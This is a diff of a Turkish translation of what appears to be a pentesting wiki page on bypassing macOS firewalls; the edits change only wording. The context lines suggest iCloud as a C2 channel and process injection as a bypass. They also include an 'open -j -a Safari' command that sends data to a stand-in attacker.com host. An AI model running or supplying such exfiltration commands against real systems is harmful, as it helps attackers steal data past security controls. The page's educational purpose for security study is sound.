@@ -22,7 +22,7 @@ Aşağıdaki teknikler bazı macOS güvenlik duvarı uygulamalarında çalışı
 
 Güvenlik duvarı, **`apple.com`** veya **`icloud.com`** gibi iyi bilinen apple alan adlarına bağlantılara izin veriyor olabilir. Ve iCloud, bir C2 olarak kullanılabilir.
 
-### Genel Aşma
+### Genel Bypass
 
 Güvenlik duvarlarını aşmayı denemek için bazı fikirler.
 
@@ -63,7 +63,7 @@ open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
 ### Süreç enjeksiyonları aracılığıyla
 
-Herhangi bir sunucuya bağlanmasına izin verilen bir **süreç içine kod enjekte edebilirseniz**, güvenlik duvarı korumalarını aşabilirsiniz:
+Eğer herhangi bir sunucuya bağlanmasına izin verilen bir **süreç içine kod enjekte edebilirseniz**, güvenlik duvarı korumalarını aşabilirsiniz:
 
 {{#ref}}
 macos-proces-abuse/
